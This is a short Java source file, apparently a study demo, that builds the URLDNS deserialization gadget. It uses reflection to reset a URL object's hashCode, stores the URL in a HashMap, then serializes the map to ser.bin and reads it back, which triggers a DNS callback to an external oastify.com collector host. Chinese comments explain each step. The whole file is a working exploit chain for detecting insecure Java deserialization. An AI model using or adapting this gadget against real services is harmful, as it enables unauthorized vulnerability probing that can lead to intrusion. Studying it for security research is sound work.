package src.ReflectDemo;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSEXP {
    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        // 这里不要发起请求
        URL url = new URL("http://0xygr1fzqq00g8u72o3qxolhl8ryfn.oastify.com");
        Class c = url.getClass();
        Field hashcodefile = c.getDeclaredField("hashCode");
        hashcodefile.setAccessible(true);
        hashcodefile.set(url,1234);
        hashmap.put(url,1);
        // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
        hashcodefile.set(url,-1);
        serialize(hashmap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
